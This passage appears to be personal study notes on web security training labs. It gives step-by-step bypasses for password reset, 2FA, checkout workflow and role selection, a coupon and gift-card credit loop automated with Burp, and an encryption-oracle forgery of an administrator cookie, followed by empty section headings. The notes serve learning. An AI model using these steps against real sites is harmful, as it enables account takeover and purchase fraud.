  - **temp-forgot-password-token**=~~sa5fk32fn68feb75ik9xp91sfoekxn11j~~s&username=wiener&new-password-1=123456&new-password-2=123456
  - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456  
- **2FA simple bypass**
  - Users won't always follow the **intended sequence**
  - skip to logged in page after 1FA
- Insufficient workflow validation
  - **Add Jacket** into cart
    - POST /cart/checkout   
  - **Error**
    - GET **/cart?err=INSUFFICIENT_FUNDS**
    - Not enough store credit for this purchase
  - Send to **repeater** to a confirmation order page
    - GET **/cart/order-confirmation?order-confirmed=true**
- Authentication bypass via flawed state machine
  - Login and intercept the next request
    - POST /login HTTP/1.1
    - csrf=5Y6EM5R6dxSayGitTEtdKdury3rwgN8X&username=wiener&password=peter   
  - **Drop the next request** GET /role-selector
    - browse to admin page, now defaulted as administrator
- Flawed enforcement of business rules
  - alternate 2 different coupon codes and reuse it multiple times (NEWCUST5, SIGNUP30)   
- Infinite money logic flaw
  > [!Burp traffic]   
  > **add gift card** to cart   
    POST /cart   
    productId=2&redir=PRODUCT&quantity=1   
  > **add coupon**   
    POST /cart/coupon   
    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&coupon=**SIGNUP30**      
    Gift card code = **lHdlmj91Nu**   
  > **place order**   
    POST /cart/checkout   
    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00   
    GET /cart/order-confirmation?order-confirmed=true     
  > **redeem gift card**   
    POST /gift-card   
    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&gift-card=lHdlmj91Nu   
    GET /my-account   
  - Settings > Project > Session > **Session handling rules panel, click "add"** > session handling rule editor appear
  - Scope tab > select '**include all URLs**'
  - Details tab > click "add" **run a micro** > click "add"
    - POST /cart
    - POST /cart/coupon
    - POST /cart/checkout
    - GET /cart/order-confirmation?order-confirmed=true > click configure item > **add a custom parameter** > name 'gift-card' > **highlight the gift card code** at the bottom of the response > Ok to go back Macro Editor
    - POST /gift-card > click configure item > under **gift-card parameter handling** > select dropdown list **'derive from prior response**' > Ok to go back Macro Editor
  - **Test Macro** > Ok to go back Burp
  - Burp Intruder > **GET /my-account** > Sniper > **null payloads** > **generate 412 payloads** > max 1 concurrent request
  - Store credit++ (Refresh the page)
- Authentication bypass via **encryption oracle**
  - Stay logged in and post a comment with invalid email to observe encrypted cookies
    ```
    Request
    POST /post/comment   
    Cookie: **stay-logged-in=OtQWW%2fHiUg1PdV%2bmbFJrDsS40zMw8R93BfkLz4m%2ftS4%3d**; session=bc5J7wZPyjr1xrVksvk9gfDmcAV31xRD   
    csrf=Xmi1r3NQeRnv8Ap0dN5nlnmZkS9nbID1&postId=4&comment=comment1&name=hacker&email=**hh.hacker.com**&website=
    
    Response
    GET /post?postId=4
    Set-Cookie: **notification=7XpfTWmxSzTjCp30OO0KfLmzXaTvnJgSd8%2bOZNjIlX5xQdyGRoVrdRJSdzta%2bAJr**;
    Body: Invalid email address: hh.hacker.com
    ```
  - Encrypt repeater: POST /post/comment > stay-logged-in
  - Decrypt repeater: GET /post?postId=4 > amend notification cookie > response
  - Create and manipulate cookies to bypass encryption prefixes
    - copy Encrypt (stay-logged-in) and replace to Decrypt (notification) > decrypt repeater send > response found "wiener:1720796160463" > copy the timestamp
    - modify the email param in **Encrypt repeater**: email=**administrator:1720796160463** > send > copy the notification cookie in response
    - replace to **Decrypt** (notification) > send > response "Invalid email address: administrator:1720796160463"   (First 23 bytes prefix - "Invalid email address: ")   

    - **Encrypt** (stay-logged-in) > in response cookie notification > send to decoder > decode as URL > decode as base 64 > delete first 23 bytes > encode as base 64 > encode as url > copy the value
    - replace to **Decrypt** (notification) > send > response error "Input length must be multiple of 16 when decrypting with padded cipher"  (23 bytes prefix + 9 chrs = 32 + user:timestamp)
      
    - **Encrypt** (stay-logged-in) > add 9 chrs to **email=xxxxxxxxxadministrator:1720796160463** > send > in response cookie notification > send to decoder > decode as URL > decode as base 64 > delete first 32 bytes > encode as base 64 > encode as url > copy the value
    - replace to **Decrypt** (notification) > send > administrator:1720796160463
      
    - intercept on > click home page > delete session cookie > replace stay-logged-in cookie (copy from decrypt notification %url) > forward
      ```
      GET / HTTP/2   
      Cookie: stay-logged-in=%52%72%76%64%79%4c%51%74%49%67%59%41%2b%58%65%5a%37%6d%4e%33%4e%62%64%73%63%48%52%2f%61%34%49%4a%54%41%4d%74%39%38%6a%79%6e%4f%59%3d;
      ```
  - Gain access as an admin and perform the required action
    
## Command Injection
Content for Command Injection...

### Command Injection Lab

## Information Disclosure
Content for Information Disclosure...

### Information Disclosure Lab

## Access Control
Content for Access Control...

### Access Control Lab

## File Upload
Content for File Upload...

### File Upload Lab

## Race Condition
Content for Race Condition...

### Race Condition Lab

## SSRF (Server-Side Request Forgery)
Content for SSRF...

### SSRF Lab

## NoSQL Injection
Content for NoSQL Injection...

### NoSQL Injection Lab

## XXE Injection
Content for XXE Injection...

### XXE Injection Lab

## API
Content for API...

### API Lab

## CSRF (Cross-Site Request Forgery)
Details about CSRF...

### CSRF Lab

## XSS (Cross-Site Scripting)
Details about XSS...

### XSS Lab

## CORS (Cross-Origin Resource Sharing)
Details about CORS...

### CORS Lab

## Clickjacking
Details about Clickjacking...

### Clickjacking Lab

## DOM-based Attacks
Details about DOM-based attacks...

### DOM-based Attacks Lab

## WebSockets
Details about WebSockets...

### WebSockets Lab

## Insecure Deserialization
Content for Insecure Deserialization...

### Insecure Deserialization Lab

## Web LLM Attacks
Content for Web LLM Attacks...

### Web LLM Attacks Lab

## GraphQL API
Content for GraphQL API...

### GraphQL API Lab

## Server-side Template Injection
Content for Server-side Template Injection...

### Server-side Template Injection Lab

## Web Cache Poisoning
Content for Web Cache Poisoning...

### Web Cache Poisoning Lab

## HTTP Host Header
Content for HTTP Host Header...

### HTTP Host Header Lab

## OAuth Authentication
Content for OAuth Authentication...

### OAuth Authenticatio Lab

## JWT Attacks
Content for JWT Attacks...

### JWT Attacks Lab

## Prototype Pollution
Content for Prototype Pollution...

### Prototype Pollution Lab

## Essential Skills
Content for Essential Skills...

